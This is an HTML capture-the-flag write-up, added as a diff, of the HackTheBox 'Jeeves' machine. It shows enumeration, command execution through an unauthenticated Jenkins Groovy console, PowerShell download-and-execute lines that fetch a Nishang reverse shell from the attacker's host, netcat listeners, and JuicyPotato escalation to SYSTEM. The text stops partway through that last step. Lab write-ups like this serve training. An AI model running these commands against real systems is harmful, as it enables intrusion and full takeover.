@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+		<h1><strong>hackthebox Jeeves</strong></h1>
+	<em>Released: 11th November 2019 / Pwned: 31st October 2019 - [+] Solved whilst Retired</em><br>
+	<br>
+	<img alt="images\2-1.png" src="images/2-1.png"><br>
+	<br>
+	Jeeves has a Jenkins installation where you can run Groovy Script code to gain a shell on the system. Once on the box, you can elevate your shell to SYTSEM using JuicyPotato (although I think JuicyPotato is an unintended method).<br>
+	<br>
+	<a id="h3-1" name="h3-1"></a><strong></strong>
+	<h4><strong>Exploits</strong></h4>
+	• JuicyPotato - <a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a><br>
+	<br>
+	<a id="h3-2" name="h3-2"></a><strong></strong>
+	<h4><strong>Links</strong></h4>
+	• <a href="https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Network-Assessment/Jenkins/Jenkins_hacking.md">https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Network-Assessment/Jenkins/Jenkins_hacking.md</a><br>
+	• <a href="https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password">https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password</a><br>
+	• <a href="https://medium.com/@exgq/hacking-jenkins-68f7f6a810eb">https://medium.com/@exgq/hacking-jenkins-68f7f6a810eb</a><br>
+	• <a href="https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/">https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/</a><br>
+	<br>
+	<a id="h2-1" name="h2-1"></a><strong></strong>
+	<h2><strong>1) Nmap</strong></h2><br>
+	Initial TCP all-ports scan:<br>
+	<code>nmap -p- -T4 -oN nmap/tcp-allports.txt 10.10.10.63</code><br>
+	<br>
+	Run service enumeration, default scripts and OS detection against open TCP ports:<br>
+	<code>nmap -p &lt;open ports&gt; -T4 -sV -sC -O -oN nmap/tcp-openports.txt 10.10.10.63</code><br>
+	<br>
+	-sV service enumeration<br>
+	-sC default scripts<br>
+	-O OS detection<br>
+	-oN default output<br>
+	<br>
+	Results:<br>
+		<div class="codebox">
+			┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>jeeves]<br>
+			└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#mkdir&nbsp;nmap</span><br>
+			┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>jeeves]<br>
+			└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nmap&nbsp;-p-&nbsp;-T4&nbsp;-oN&nbsp;nmap/tcp-all.txt&nbsp;10.10.10.63</span><br>
+			[...]<br>
+			<br>
+			PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE<br>
+			80<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;http<br>
+			135<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;msrpc<br>
+			445<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;microsoft-ds<br>
+			50000<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;ibm-db2<br>
+			<br>
+			┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>jeeves]<br>
+			└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nmap&nbsp;-p&nbsp;80,135,445,50000&nbsp;-sV&nbsp;-sC&nbsp;-O&nbsp;-oN&nbsp;nmap/tcp-open.txt&nbsp;10.10.10.63</span><br>
+			[...]<br>
+			<br>
+			PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VERSION<br>
+			80<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;IIS&nbsp;httpd&nbsp;10.0<br>
+			<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;http-methods<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+			<span style="color:#ff9d00;font-weight:700">|</span>_&nbsp;&nbsp;Potentially&nbsp;risky&nbsp;methods<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;TRACE<br>
+			<span style="color:#ff9d00;font-weight:700">|</span>_http-server-header<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Microsoft-IIS<span style="color:#ff9d00;font-weight:700">/</span>10.0<br>
+			<span style="color:#ff9d00;font-weight:700">|</span>_http-title<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Ask&nbsp;Jeeves<br>
+			135<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
+			445<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;microsoft-ds&nbsp;Microsoft&nbsp;Windows&nbsp;7&nbsp;-&nbsp;10&nbsp;microsoft-ds&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>workgroup<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;WORKGROUP<span style="color:#ff9d00;font-weight:700">)</span><br>
+			50000<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Jetty&nbsp;9.4.z-SNAPSHOT<br>
+			<span style="color:#ff9d00;font-weight:700">|</span>_http-server-header<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Jetty<span style="color:#ff9d00;font-weight:700">(</span>9.4.z-SNAPSHOT<span style="color:#ff9d00;font-weight:700">)</span><br>
+			<span style="color:#ff9d00;font-weight:700">|</span>_http-title<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Error&nbsp;404&nbsp;Not&nbsp;Found<br>
+			Warning<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;OSScan&nbsp;results&nbsp;may&nbsp;be&nbsp;unreliable&nbsp;because&nbsp;we&nbsp;could&nbsp;not&nbsp;<span style="color:#ff9d00;font-weight:700">find</span>&nbsp;at&nbsp;least&nbsp;1&nbsp;open&nbsp;and&nbsp;1&nbsp;closed&nbsp;port<br>
+			Aggressive&nbsp;OS&nbsp;guesses<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Microsoft&nbsp;Windows&nbsp;Server&nbsp;2008&nbsp;R2&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>91%<span style="color:#ff9d00;font-weight:700">)</span>,&nbsp;Microsoft&nbsp;Windows&nbsp;10&nbsp;1511&nbsp;-&nbsp;1607&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>87%<span style="color:#ff9d00;font-weight:700">)</span><br>
+			Service&nbsp;Info<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Host<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;JEEVES<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;OS<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Windows<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;CPE<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;cpe<span style="color:#ff9d00;font-weight:700">:/</span>o<span style="color:#ff9d00;font-weight:700">:</span>microsoft<span style="color:#ff9d00;font-weight:700">:</span>windows
+		</div>
+	</div><br>
+	<br>
+	Analysis:<br>
+	• <code>80/http</code> - Ask Jeeves! Nothing to find here. The links are garbage and no gobuster results.<br>
+	• <code>445/SMB</code> - NULL sessions aren't allowed, so credentials are required to access SMB. Nothing to do here for the time being<br>
+	• <code>50000/http</code> - Another, more hidden, webserver...<br>
+	<br>
+	<a id="h2-2" name="h2-2"></a><strong></strong>
+	<h2><strong>2) 50000/http - Jetty</strong></h2><br>
+	Jetty is a Java HTTP server by Eclipse.<br>
+	According to wikipedia, it's often used for machine to machine communications.<br>
+	<br>
+	The intial page yields an error.<br>
+	But gobuster finds a working directory - <code>/askjeeves</code><br>
+		<div class="codebox">
+			┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>jeeves<span style="color:#ff9d00;font-weight:700">/</span>http50]<br>
+			└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#gobuster&nbsp;dir&nbsp;-e&nbsp;-u&nbsp;http://10.10.10.63:50000&nbsp;-w&nbsp;/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&nbsp;-x&nbsp;.txt,.asp,.aspx&nbsp;-s&nbsp;200,204,301,302,307,401,403,500&nbsp;-o&nbsp;gb2.txt</span><br>
+			===============================================================<br>
+			Gobuster&nbsp;v3.0.1<br>
+			by&nbsp;OJ&nbsp;Reeves&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>@TheColonial<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">&amp;</span>&nbsp;Christian&nbsp;Mehlmauer&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>@_FireFart_<span style="color:#ff9d00;font-weight:700">)</span><br>
+			===============================================================<br>
+			[+]&nbsp;Url<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.63<span style="color:#ff9d00;font-weight:700">:</span>50000<br>
+			[+]&nbsp;Threads<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10<br>
+			[+]&nbsp;Wordlist<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>wordlists<span style="color:#ff9d00;font-weight:700">/</span>dirbuster<span style="color:#ff9d00;font-weight:700">/</span>directory-list-2.3-medium.txt<br>
+			[+]&nbsp;Status&nbsp;codes<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;200,204,301,302,307,401,403,500<br>
+			[+]&nbsp;User&nbsp;Agent<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;gobuster<span style="color:#ff9d00;font-weight:700">/</span>3.0.1<br>
+			[+]&nbsp;Extensions<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;txt,asp,aspx<br>
+			[+]&nbsp;Expanded<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">true</span><br>
+			[+]&nbsp;Timeout<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10s<br>
+			===============================================================<br>
+			2019<span style="color:#ff9d00;font-weight:700">/</span>10<span style="color:#ff9d00;font-weight:700">/</span>31&nbsp;18<span style="color:#ff9d00;font-weight:700">:</span>26<span style="color:#ff9d00;font-weight:700">:</span>21&nbsp;Starting&nbsp;gobuster<br>
+			===============================================================<br>
+			http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.63<span style="color:#ff9d00;font-weight:700">:</span>50000<span style="color:#ff9d00;font-weight:700">/</span>askjeeves&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;302<span style="color:#ff9d00;font-weight:700">)</span>
+		</div>
+	</div><br>
+	<br>
+	<a id="h3-3" name="h3-3"></a><strong></strong>
+	<h3><strong>2a) /askjeeves/ - Jenkins</strong></h3><br>
+	<code>/askjeeves/</code> is the URL of a Jenkins installation.<br>
+	<img alt="images\2-2.png" src="images/2-2.png"><br>
+	<br>
+	Jenkins is automation software designed to help developers to run/build/test/deploy software each time a developer updates the source code.<br>
+	<br>
+	By default, Jenkins doesn't require a password.<br>
+	<br>
+	<a id="h3-4" name="h3-4"></a><strong></strong>
+	<h3><strong>2b) Jenkins Code Execution - /script</strong></h3><br>
+	Jenkins has a <code>Groovy Script</code> console at <code>/script</code> (Manage Jenkins &gt; Script Console), where we can execute system commands.<br>
+	<br>
+	<a href="http://10.10.10.63:50000/askjeeves/script">http://10.10.10.63:50000/askjeeves/script</a><br>
+	<br>
+	There are 2 ways to execute system commands in the Groovy Script console:<br>
+	<br>
+	Option 1)<br>
+		<div class="codebox">
+			def&nbsp;sout&nbsp;=&nbsp;new&nbsp;<span style="color:#ffdd00;font-weight:400">StringBuffer()</span>,&nbsp;serr&nbsp;=&nbsp;new&nbsp;<span style="color:#ffdd00;font-weight:400">StringBuffer()</span><br>
+			def&nbsp;proc&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'cmd.exe&nbsp;/c&nbsp;whoami'</span>.<span style="color:#ffdd00;font-weight:400">execute()</span><br>
+			proc.consumeProcessOutput<span style="color:#ff9d00;font-weight:700">(</span>sout,&nbsp;serr<span style="color:#ff9d00;font-weight:700">)</span><br>
+			proc.waitForOrKill<span style="color:#ff9d00;font-weight:700">(</span>1000<span style="color:#ff9d00;font-weight:700">)</span><br>
+			println&nbsp;<span style="color:#3ad900;font-weight:400">"out&gt;&nbsp;$sout&nbsp;err&gt;&nbsp;$serr"</span>
+		</div>
+	</div><br>
+	<br>
+	Option 2)<br>
+		<div class="codebox">
+			println&nbsp;“cmd.exe&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>c&nbsp;<span style="color:#ff9d00;font-weight:700">whoami</span>�.<span style="color:#ffdd00;font-weight:400">execute()</span>.text
+		</div>
+	</div><br>
+	<br>
+	I used option 2.<br>
+	<img alt="images\2-3.png" src="images/2-3.png"><br>
+	<br>
+	From here, we can get a shell on the system.<br>
+	I used Nishang's <code>Invoke-PowerShellTcp.ps1</code>, served it to the target machine with <code>python -m SimpleHTTPServer</code>, and used the Groovy Script console to download &amp; execute the script to achieve a shell on the system.<br>
+	<br>
+	<a id="h1-2" name="h1-2"></a><strong></strong>
+	<h1><strong>Gain Access</strong></h1>
+	<br>
+	<a id="h2-3" name="h2-3"></a><strong></strong>
+	<h2><strong>3) Nishang + Groovy Script</strong></h2><br>
+	Nishang is available here - <a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a><br>
+	Nishang's <code>Invoke-PowerShellTcp.ps1</code> script can be used to send a reverse shell back our attacking system.<br>
+	<br>
+	Copy <code>Invoke-PowerShellTcp.ps1</code> to your working directory, or download it from github if you don't have it.<br>
+		<div class="codebox">
+			┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>jeeves<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+			└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#locate&nbsp;Invoke-PowerShellTcp.ps1</span><br>
+			<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>nishang<span style="color:#ff9d00;font-weight:700">/</span>Shells<span style="color:#ff9d00;font-weight:700">/</span>Invoke-PowerShellTcp.ps1<br>
+			┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>jeeves<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+			└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#cp&nbsp;/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1&nbsp;.</span>
+		</div>
+	</div><br>
+	<br>
+	Edit <code>Invoke-PowerShellTcp.ps1</code>.<br>
+	At the end of the script, configure the IP address and port you want to the script to call back to (your attacking machine, basically).<br>
+		<div class="codebox">
+			┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>jeeves<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+			└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nano&nbsp;Invoke-PowerShellTcp.ps1&nbsp;</span><br>
+			[...]<br>
+			Invoke-PowerShellTcp&nbsp;-Reverse&nbsp;-IPAddress&nbsp;10.10.14.12&nbsp;-Port&nbsp;9001
+		</div>
+	</div><br>
+	<br>
+	Start a listener to receive the shell on the port you just specified<br>
+		<div class="codebox">
+			┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>jeeves]<br>
+			└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nc&nbsp;-lnvp&nbsp;9001</span><br>
+			listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+		</div>
+	</div><br>
+	<br>
+	And serve the script to the taret with <code>python -m SimpleHTTPServer</code><br>
+		<div class="codebox">
+			┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>jeeves<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+			└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#python&nbsp;-m&nbsp;SimpleHTTPServer&nbsp;</span><br>
+			Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...
+		</div>
+	</div><br>
+	<br>
+	We've set up a listener to receive the shell, and have set up a web server to serve the Nishang script to the target.<br>
+	<br>
+	Send a command to the Script Console to download the Nishang script from your attacking host.<br>
+	<code>println "cmd.exe /c powershell -c \"IEX(New-Object Net.WebClient).downloadString('</code><a href="http://10.10.14.12:8000/Invoke-PowerShellTcp.ps1')/">http://10.10.14.12:8000/Invoke-PowerShellTcp.ps1')\"".execute().text</a><br>
+	<br>
+	You should receive a shell on your listener!<br>
+	Grab <code>user.txt</code> :)<br>
+		<div class="codebox">
+			[...]<br>
+			listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+			connect&nbsp;to&nbsp;[10.10.14.12]&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>UNKNOWN<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[10.10.10.63]&nbsp;49678<br>
+			Windows&nbsp;PowerShell&nbsp;running&nbsp;as&nbsp;user&nbsp;kohsuke&nbsp;on&nbsp;JEEVES<br>
+			Copyright&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>C<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;2015&nbsp;Microsoft&nbsp;Corporation.&nbsp;All&nbsp;rights&nbsp;reserved.<br>
+			<br>
+			PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#333333;font-weight:400">\.</span>jenkins&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\k</span>ohsuke<span style="color:#333333;font-weight:400">\D</span>esktop<span style="color:#333333;font-weight:400">\u</span>ser.txt<br>
+			e3232272596f...
+		</div>
+	</div><br>
+	<br>
+	<a id="h1-3" name="h1-3"></a><strong></strong>
+	<h1><strong>Priv-Esc to SYSTEM</strong></h1>
+	<br>
+	<a id="h2-4" name="h2-4"></a><strong></strong>
+	<h2><strong>4) JuicyPotato.exe</strong></h2><br>
+	Check what privileges you have.<br>
+		<div class="codebox">
+			PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#333333;font-weight:400">\.</span>jenkins<span style="color:#ffdd00;font-weight:400">&gt;</span><span style="color:#ff9d00;font-weight:700">whoami</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>priv<br>
+			<br>
+			PRIVILEGES&nbsp;INFORMATION<br>
+			----------------------<br>
+			<br>
+			Privilege&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Description&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;State&nbsp;&nbsp;&nbsp;<br>
+			=============================&nbsp;=========================================&nbsp;========<br>
+			SeShutdownPrivilege&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Shut&nbsp;down&nbsp;the&nbsp;system&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disabled<br>
+			SeChangeNotifyPrivilege&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Bypass&nbsp;traverse&nbsp;checking&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Enabled&nbsp;<br>
+			SeUndockPrivilege&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Remove&nbsp;computer&nbsp;from&nbsp;docking&nbsp;station&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disabled<br>
+			SeImpersonatePrivilege&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Impersonate&nbsp;a&nbsp;client&nbsp;after&nbsp;authentication&nbsp;Enabled&nbsp;<br>
+			SeCreateGlobalPrivilege&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Create&nbsp;global&nbsp;objects&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Enabled&nbsp;<br>
+			SeIncreaseWorkingSetPrivilege&nbsp;Increase&nbsp;a&nbsp;process&nbsp;working&nbsp;<span style="color:#ff9d00;font-weight:700">set</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disabled<br>
+			SeTimeZonePrivilege&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Change&nbsp;the&nbsp;time&nbsp;zone&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disabled
+		</div>
+	</div><br>
+	<br>
+	With <code>SeImpersonatePrivilege</code> enabled, we can use the <code>JuicyPotato</code> exploit to execute commands as SYSTEM.<br>
+	The JuicyPotato info &amp; binary is available here - <a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a><br>
+	<br>
+	To get a shell with <code>JuicyPotato</code>, you create a <code>.bat</code> script containg the commands you want JuicyPotato to run as SYSTEM. You then run <code>JuicyPotato</code>, point to your <code>.bat</code> file, and the commands in your <code>.bat</code> file will run as root.<br>
+	<br>
+	To get a shell as SYSTEM, I used Nishang again.<br>
+	I wrote a powershell command to download &amp; execute <code>Invoke-PowerShellTcp.ps1</code> into a <code>.bat</code> file, and had JuicyPotato execute it.<br>
+	<br>
+	<a id="h3-5" name="h3-5"></a><strong></strong>
+	<h3><strong>4a) Prep Nishang shell &amp; .bat file</strong></h3><br>
+	Prep <code>Invoke-PowerShellTcp.ps1</code> to send a reverse shell back to your attacking system.<br>
+		<div class="codebox">
+			┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>jeeves<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+			└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#cp&nbsp;/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1&nbsp;./InvokePowerShellTcp9003.ps1</span><br>
+			┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>jeeves<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+			└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nano&nbsp;Invoke-PowerShellTcp9003.ps1</span><br>
+			[...]<br>
+			Invoke-PowerShellTcp&nbsp;-Reverse&nbsp;-IPAddress&nbsp;10.10.14.12&nbsp;-Port&nbsp;9003
+		</div>
+	</div><br>
+	<br>
+	Start a listener on your attacking machine to receive the nishang reverse shell<br>
+		<div class="codebox">
+			┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>jeeves]<br>
+			└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nc&nbsp;-lvnp&nbsp;9003</span><br>
+			listening&nbsp;on&nbsp;[any]&nbsp;9003&nbsp;...
+		</div>
+	</div><br>
+	<br>
+	Create a <code>.bat</code> file which downloads your <code>Invoke-PowerShellTcp.ps1</code> from your attacking machine.<br>
+		<div class="codebox">
+			┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>jeeves<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+			└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nano&nbsp;adminshell.bat</span><br>
+			powershell&nbsp;<span style="color:#3ad900;font-weight:400">"IEX(New-Object&nbsp;Net.WebClient).downloadString('http://10.10.14.12:8000/Invoke-PowerShellTcp9003.ps1')"</span>
+		</div>
+	</div><br>
+	<br>
+	<a id="h3-6" name="h3-6"></a><strong></strong>
+	<h3><strong>4b) Serve JuicyPotato and .bat to the target sytsem</strong></h3><br>
+	Download JuicyPotato to your attacking system.<br>
+		<div class="codebox">
+			┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>jeeves<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+			└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#wget&nbsp;-q&nbsp;https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe</span>
+		</div>
+	</div><br>
+	<br>
+	Serve <code>JuicyPotato</code> and your <code>.bat</code> file to the target machine with <code>python -m SimpleHTTPServer</code><br>
+		<div class="codebox">
+			┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>jeeves<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+			└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#python&nbsp;-m&nbsp;SimpleHTTPServer&nbsp;</span><br>
+			Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...
+		</div>
+	</div><br>
+	<br>
+	And download the files from your attacking machine to the target<br>
+		<div class="codebox">
+			PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\k</span>ohsuke<span style="color:#333333;font-weight:400">\D</span>esktop&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>New-Object&nbsp;System.Net.WebClient<span style="color:#ff9d00;font-weight:700">)</span>.DownloadFile<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'http://10.10.14.12:8000/JuicyPotato.exe'</span>,<span style="color:#3ad900;font-weight:400">'C:\Users\kohsuke\Desktop\JuicyPotato.exe'</span><span style="color:#ff9d00;font-weight:700">)</span><br>
